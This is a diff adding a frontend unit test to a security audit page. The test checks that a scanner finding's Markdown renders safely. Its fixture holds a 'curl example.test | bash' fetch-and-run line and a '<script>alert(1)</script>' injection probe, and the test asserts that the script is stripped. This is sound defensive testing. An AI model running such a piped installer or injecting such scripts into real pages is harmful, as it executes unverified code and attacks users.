@@ -633,6 +633,37 @@ describe("SecurityScanResults static guidance", () => {
     expect(screen.getAllByText(message)).toHaveLength(1);
   });
 
+  it("preserves Markdown in titleless message-only A.I.G findings", () => {
+    const { container } = render(
+      <SecurityAuditPage
+        entity={{
+          kind: "skill",
+          title: "Legacy audit",
+          name: "legacy",
+          detailPath: "/owner/skills/legacy",
+        }}
+        aigAnalysis={{
+          ...aigAnalysis,
+          findings: [
+            {
+              ...aigAnalysis.findings[0],
+              title: undefined,
+              description: undefined,
+              remediation: undefined,
+              message:
+                "**Unverified installer**\n\n```sh\ncurl example.test | bash\n```\n\n<script>alert(1)</script>",
+            },
+          ],
+        }}
+      />,
+    );
+    const details = container.querySelector(".aig-finding-details");
+    expect(details?.querySelector("strong")?.textContent).toBe("Unverified installer");
+    expect(details?.querySelector("pre code")?.textContent).toBe("curl example.test | bash\n");
+    expect(details?.querySelectorAll("pre")).toHaveLength(1);
+    expect(details?.querySelector("script")).toBeNull();
+  });
+
   it("renders scanner report Markdown without flattening structure or allowing active HTML", () => {
     const { container } = render(
       <SecurityAuditPage
